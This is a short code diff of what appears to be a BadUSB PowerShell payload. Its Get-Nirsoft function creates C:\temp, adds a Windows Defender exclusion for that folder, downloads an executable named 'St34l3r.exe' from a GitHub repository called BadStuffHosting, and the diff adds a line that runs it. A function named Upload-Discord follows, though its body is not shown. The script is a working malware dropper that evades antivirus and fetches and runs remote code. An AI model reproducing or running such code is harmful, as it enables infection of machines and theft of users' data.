@@ -3,7 +3,8 @@ function Get-Nirsoft {
     mkdir \temp
     cd \temp
     Add-MpPreference -ExclusionPath "C:\temp"
-    Invoke-WebRequest -Uri "https://github.com/Gvte-Kali/BadStuffHosting/raw/main/BadUSB/W1ns1d3r/testing/St34l3r.exe" -OutFile Iwyp.exe
+    Invoke-WebRequest -Uri "https://github.com/Gvte-Kali/BadStuffHosting/raw/main/BadUSB/W1ns1d3r/testing/St34l3r.exe" -OutFile St34l3r.exe
+    .\St34l3r.exe
 }
 
 function Upload-Discord {
